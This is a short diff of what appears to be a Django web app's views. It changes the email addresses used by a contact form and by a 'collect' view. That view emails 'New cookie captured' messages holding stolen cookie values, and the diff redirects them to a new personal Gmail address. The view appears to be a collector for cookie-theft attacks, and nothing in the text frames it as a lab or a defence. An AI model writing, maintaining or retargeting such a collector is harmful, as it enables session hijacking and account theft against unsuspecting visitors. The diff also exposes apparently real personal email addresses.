@@ -33,7 +33,7 @@ def contact(request):
             subject=f'New Contact Message from {name}',
             message=message,
             from_email=email,
-            recipient_list=['oboulechfar1@gmail.com'],
+            recipient_list=['rihemrihem21000@gmail.com'],
             fail_silently=False,
         )
 
@@ -60,8 +60,8 @@ def collect(request):
         send_mail(
             subject="Cookie Captured",
             message=f"New cookie captured: {cookie_value}",
-            from_email="oboulechfar1@gmail.com",
-            recipient_list=["oboulechfar1@gmail.com"],
+            from_email="rihemrihem21000@gmail.com",
+            recipient_list=["rihemrihem21000@gmail.com"],
             fail_silently=False,
         )
 
